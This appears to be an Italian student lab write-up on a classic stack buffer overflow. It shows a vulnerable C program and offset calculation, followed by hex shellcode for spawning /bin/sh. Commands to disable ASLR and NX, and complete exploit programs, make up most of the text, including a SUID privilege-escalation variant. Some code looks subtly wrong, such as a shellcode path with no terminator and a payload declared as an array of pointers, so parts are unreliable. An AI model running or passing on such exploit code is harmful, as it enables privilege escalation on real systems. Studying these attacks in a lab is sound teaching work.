# Pràctica 2

# Part 1

Programma vulnerabile

```c
#include <stdio.h>
#include <string.h>

void function(char *input) {
    char buffer[64];
    strcpy(buffer, input); // <-- Here, no check 
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        function(argv[1]);
    } else {
        printf("Usage: %s <input>\n", argv[0]);
    }
    return 0;
}
```

La vulnerabilità risiede nella funzione `strcpy(buffer, input)`, dove l'input dell'utente viene copiato nel buffer locale senza alcun controllo sulla lunghezza. Questo permette all'utente di fornire un input più lungo di 64 byte, causando un *overflow* dello stack. Tale condizione può essere sfruttata per sovrascrivere il valore del registro di ritorno (`ret`) e dirottare l’esecuzione del programma. 

Ad esempio per eseguire una *shellcode*.

## Calcolo dell’offset

Per poter sovrascrivere correttamente il valore di `ret`, è necessario conoscere la disposizione della memoria sullo stack.

![image.png](.image.png)

Come da immagine lo stack cresce dal altro verso il basso delle memoria, quindi per sovrascrivere il registro di ritorno `ret` dobbiamo calcolare quanti bytes distano dal primo indirizzo del buffer fino al `ret`.

Sapendo che per ogni elemento del `char* buffer[64]` occupa 1 byte e che il registro`sfp`o `brp`, che punta all’inizio dello stack (primo elemento), occupa 8 bytes. 
Quindi facendo i calcoli per sovrascrivere `ret` dobbiamo spostarci di:

- 64 byte di `buffer`
- 8 byte di `SFP` (registro `rbp` salvato)

Totale: 64 + 8 = 72 byte.

Questo significa che l’offset necessario per raggiungere  e sovrascrivere il registro di ritorno `ret` è **72 byte** rispetto a Buffer.

## Creazione del Payload

Per sfruttare questa vulnerabilità, dobbiamo creare un **payload**.

Un **payload** è la parte dell’input che viene iniettata nello stack (o in un'altra zona della memoria) per forzare il programma a eseguire un'azione non prevista, come ad esempio l’avvio di una shell.

Nel nostro caso, vogliamo eseguire una **shellcode**, ovvero una sequenza di istruzioni che apre una shell (`/bin/sh`).

### Scrittura della Shellcode

La shellcode va scritta in **linguaggio assembly**, e poi convertita in **formato esadecimale** per poter essere iniettata all’interno del programma vulnerabile.

L’obiettivo della shellcode sarà invocare la system call `execve("/bin/sh", NULL, NULL)` sulla nostra architettura (x86_64), che ci darà accesso a una shell interattiva.

```c
unsigned char shellcode[] =
  "\x6a\x3b"                    // push   0x3b
  "\x58"                        // pop    rax
  "\x99"                        // cdq
  "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x2f"  // mov rbx, "//bin/sh/"
  "\x53"                        // push   rbx
  "\x48\x89\xe7"                // mov    rdi, rsp
  "\x52"                        // push   rdx
  "\x57"                        // push   rdi
  "\x48\x89\xe6"                // mov    rsi, rsp
  "\x0f\x05";                   // syscall
```

Dopo avere sviluppato la shellcode dobbiamo completare la creazione del payload

```c
char payload[80];
//Preparazione payload
memset(payload, 0x90, sizeof(payload)); // NOP sled

memcpy(payload+16, shellcode, sizeof(shellcode)); // shellcode a offset 16
```

In questo frammento di codice

- Inizializziamo un array di 80 byte
- Lo riempiamo di istruzioni **`nop`**, in esadecimale `0x90` , questa tecnica ci permette di aumentare la probabilità di esecuzione della nostra shellcode anche se magari l’indirizzo di ritono non è preciso al byte
- Inseriamo la shellcode all’interno del buffer, a partire da un certo offset (in questo caso 16), per evitare problemi di allineamento o di corruzione dei dati.

### Sovrascrivere l’indirizzo di ritorno

Ora dobbiamo completare il payload aggiungendo, alla fine, un indirizzo che sovrascriva il **return address** (registro `ret`) della funzione. Questo indirizzo deve puntare a una zona del payload dove è presente la shellcode (oppure dentro il NOP sled).

```c
void *ret_addr = (void*)(0x7fffffffecc0 + 2); // Puntiamo alla shellcode (con piccolo offset)
memcpy(payload + 72, &ret_addr, 8); // Sovrascriviamo RIP dopo 72 byte
```

- `0x7fffffffecc0` Rappresenta l’indirizzo di partenza del buffer (ottenuto tramite gdb), aggiungiamo un offset di `+2` per essere sicuri di atterrare dentro al NOP o direttamente nella shellcode.
- `memcpy(payload + 72, &ret_addr, 8)` sovrascrive gli 8 byte del return address con il nostro indirizzo, in modo che al termine della funzione venga eseguita la shellcode.

---

**Recupero del indirizzo del Buffer:**

Per individuare l’idirizzo del buffer, avviamo il nostro programma vulnerabile con gdb andiamo a individuare l’indirizzo di memoria dell’buffer, con l’utilizzo del comando `p &buffer`

![image.png](.image%201.png)

Per farlo in questo caso dobbiamo per dobbiamo disattivare la protezione ASRL del kernel, che

---

### Disattivazione delle Protezioni del Sistema

Per permettere al nostro exploit di funzionare correttamente, dobbiamo disabilitare alcune protezioni di sicurezza attive nei sistemi moderni.

- **ASLR (Address Space Layout Randomization)**
    
    Per far sì che l'indirizzo dell buffer, quindi della shellcode,  sia sempre lo stesso (e quindi l'exploit funzioni in modo deterministico), dobbiamo disattivare la protezione **ASLR** (*Address Space Layout Randomization*). Questa protezione, infatti, cambia gli indirizzi di memoria ad ogni esecuzione del programma.
    
    ```bash
    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
    ```
    
- **NX (No-eXecute)**
    
    La **protezione NX** impedisce l’esecuzione di codice nelle aree di memoria marcate come dati, come ad esempio lo **stack**. Poiché noi stiamo iniettando la shellcode nello stack, dobbiamo disabilitare anche questa protezione. 
    Per farlo bisogna compilare il programma vulnerabile con il seguente comando, disablitando le protezioni del compilatore
    
    ```bash
    gcc -fno-stack-protector -z execstack vuln.c -o vuln
    ```
    

---

## Avvio del programma vulnerabile tramite exploit

Arrivati a questo punto con il nostro payload completo e con tutte le protezioni disabilitate, possiamo eseguire il nostro programma vulnerabile tramite l’exploit.

Possiamo farlo tramite una chiamata a `execve()`, che esegue il binario passando il nostro payload come argomento:

```c
    char *args[] = {"./vuln", payload, NULL};
    execve("./vuln", args, NULL);
    perror("execve");  //Se fallisce, stampa errore
```

- `args` è un array di puntatori che contiene il nome del programma (`"./vuln"`) e il nostro `payload`

---

## Avvio del exploit

Compiliamo e avviamo l’exploit.

```bash
gcc -fno-stack-protector -z execstack exploit.c -o exploit
./exploit
```

## Codice completo

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Shellcode per execve("/bin/sh", NULL, NULL)

unsigned char shellcode[] =
  "\x6a\x3b"                    // push   0x3b
  "\x58"                        // pop    rax
  "\x99"                        // cdq
  "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x2f"  // mov rbx, "//bin/sh/"
  "\x53"                        // push   rbx
  "\x48\x89\xe7"                // mov    rdi, rsp
  "\x52"                        // push   rdx
  "\x57"                        // push   rdi
  "\x48\x89\xe6"                // mov    rsi, rsp
  "\x0f\x05";                   // syscall

unsigned char* payload[80];

int main() {

    char payload[80];
    // Preparazione payload
    printf("Indirizzo di payload: %p\n", payload);
    memset(payload, 0x90, sizeof(payload)); // NOP sled

    memcpy(payload+16, shellcode, sizeof(shellcode)); // shellcode a offset 16

    void *ret_addr = (void*)(0x7fffffffecc0+2); // puntiamo dritti alla shellcode
    memcpy(payload + 72, &ret_addr, 8); // overwrite di RIP
    
    // Corretto: array di stringhe per gli argomenti
    char *args[] = {"./vuln", payload, NULL};
    execve("./vuln", args, NULL);
    perror("execve");  // Se fallisce, stampa errore
    return 1;
}

```

# Part 2 - Exploit con SUID

Adesso volgiamo sfruttare la vulnerabilità del programma con il **bit SUID attivo,** ereditare i permessi del proprietario del file

### SUID (**Set owner User ID up on execution)**

Il **bit SUID (Set User ID)** è un flag che può essere applicato a un file eseguibile. Quando un programma con SUID attivo viene eseguito, il processo assume i **permessi del proprietario del file**, anziché quelli dell'utente che lo lancia.

## Modifica della Shellcode per mantenere i privilegi

Per fare ciò dobbiamo solamente modificare la shellcode utilizzando la chiamata a funzione `setuid(geteuid())`

Questa chiamata assicura che il processo attivo abbia UID ed EUID uguali, mantenendo i privilegi del binario con SUID.

Per scrivere la shellcode, dobbiamo utilizzare le chiamate sycall, consultando il sito [https://x64.syscall.sh/](https://x64.syscall.sh/) 
Questo sito fornisce l'elenco completo delle syscall per Linux in architettura 64 bit.

```nasm
;geteuid()
    xor rax, rax
    mov al, 107
    syscall

    ; setuid(geteuid())
    mov rdi, rax
    mov al, 105
    syscall

    ; execve("/bin/sh", NULL, NULL)
    xor rax, rax
    mov al, 59
    xor rdi, rdi
    push rdi
    mov rdi, 0x68732f6e69622f2f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
```

- Prima **ottengo** l’EUID (con `geteuid()`), che è il vero ID del proprietario del processo.
- Poi uso `setuid()` per dire al sistema: "voglio usare questi privilegi come UID reale".
- Infine lancio `/bin/sh`.

Convertito in esadecimale diventa

```c
unsigned char shellcode[] =
  "\x6a\x6b"              // push 0x6b (geteuid)
  "\x58"                  // pop rax
  "\x0f\x05"              // syscall
  "\x48\x89\xc7"          // mov rdi, rax
  "\x6a\x69"              // push 0x69 (setuid)
  "\x58"                  // pop rax
  "\x0f\x05"              // syscall
  "\x6a\x3b"              // push 0x3b
  "\x58"                  // pop rax
  "\x99"                  // cdq
  "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  // mov rbx, "/bin/sh"
  "\x53"                  // push rbx
  "\x48\x89\xe7"          // mov rdi, rsp
  "\x52"                  // push rdx
  "\x57"                  // push rdi
  "\x48\x89\xe6"          // mov rsi, rsp
  "\x0f\x05";             // syscall
```

Quindi il codice completo è: (rimane idendito a parte la nuova shellcode) 

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char shellcode[] =
  "\x6a\x6b"              // push 0x6b (geteuid)
  "\x58"                  // pop rax
  "\x0f\x05"              // syscall
  "\x48\x89\xc7"          // mov rdi, rax
  "\x6a\x69"              // push 0x69 (setuid)
  "\x58"                  // pop rax
  "\x0f\x05"              // syscall
  "\x6a\x3b"              // push 0x3b
  "\x58"                  // pop rax
  "\x99"                  // cdq
  "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  // mov rbx, "/bin/sh"
  "\x53"                  // push rbx
  "\x48\x89\xe7"          // mov rdi, rsp
  "\x52"                  // push rdx
  "\x57"                  // push rdi
  "\x48\x89\xe6"          // mov rsi, rsp
  "\x0f\x05";             // syscall

unsigned char* payload[80];

int main() {
    printf("Indirizzo di payload: %p\n", payload);
    memset(payload, 0x90, sizeof(payload)); // NOP sled

    memcpy(payload, shellcode, sizeof(shellcode)); // inserisce shellcode

    void *ret_addr = (void*)(0x7fffffffecc0 + 2); // aggiornare se necessario
    memcpy(payload + 72, &ret_addr, 8); // overwrite RIP

    char *args[] = {"./vuln", (char*)payload, NULL};
    execve("./vuln", args, NULL);
    perror("execve");
    getchar();
    return 1;
}

```